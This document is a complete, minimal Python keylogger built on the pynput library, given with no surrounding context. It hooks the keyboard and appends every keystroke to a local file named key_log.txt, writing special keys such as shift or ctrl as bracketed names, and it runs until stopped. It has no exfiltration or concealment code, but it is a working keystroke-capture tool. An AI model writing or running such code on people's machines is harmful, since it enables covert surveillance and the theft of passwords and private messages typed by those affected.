from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    try:
        # Write regular character keys (letters, numbers, etc.)
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            else:
                # For other special keys like shift, ctrl, etc.
                f.write(f"[{key.name}]")

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
